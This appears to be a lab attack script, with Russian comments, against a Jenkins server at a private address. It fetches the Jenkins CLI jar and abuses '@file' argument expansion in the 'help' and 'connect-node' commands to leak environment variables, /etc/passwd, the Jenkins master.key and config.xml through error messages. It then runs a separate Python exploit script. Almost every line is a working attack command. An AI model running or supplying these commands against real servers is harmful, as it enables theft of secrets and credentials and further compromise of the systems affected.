wget -q http://172.20.0.105:8080/jnlpJars/jenkins-cli.jar
file jenkins-cli.jar
# Атака A: получение переменных окружения (первая строка файла в сообщении об ошибке)
java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http help "@/proc/self/environ"
# Атака B: полное содержимое файла через ошибки "No such agent"
java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http connect-node "@/etc/passwd"
# Атака C: извлечение секретов Jenkins
java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http help "@/var/jenkins_home/secrets/master.key"
java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http connect-node "@/var/jenkins_home/config.xml"
# Атака D: автоматизация через Python
python3 /home/attacks/jenkins/jenkins_exploit.py http://172.20.0.105:8080/